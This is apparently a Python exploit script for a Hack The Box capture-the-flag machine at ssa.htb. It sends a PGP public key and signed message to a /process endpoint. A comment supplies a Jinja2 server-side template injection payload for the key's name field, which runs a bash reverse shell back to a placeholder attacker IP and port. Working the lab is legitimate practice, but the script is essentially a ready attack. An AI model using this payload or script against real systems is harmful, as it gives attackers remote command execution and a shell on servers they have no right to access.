import requests
import sys

url = 'https://ssa.htb'

# please generate key on: https://pgpkeygen.com/
# and sign message on: http://www.2pih.com/pgp.html
# SSTI payload under `name` = {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"').read() }}
def openPGP():
    with open("public.key", "rb") as pk:
        public_key = pk.read().decode()
    with open("signed.txt", "rb") as st:
        signed_text = st.read().decode()

    return public_key, signed_text

def verifySign(public, signed):
    session = requests.session()
    # session.proxies.update({'http': 'http://127.0.0.1:8080'}) # debug

    body = {
        'signed_text': signed,
        'public_key': public
    }
    session.post(f'{url}/process', data=body, verify=False)

if __name__ == "__main__":
    public, signed = openPGP()
    verifySign(public, signed)
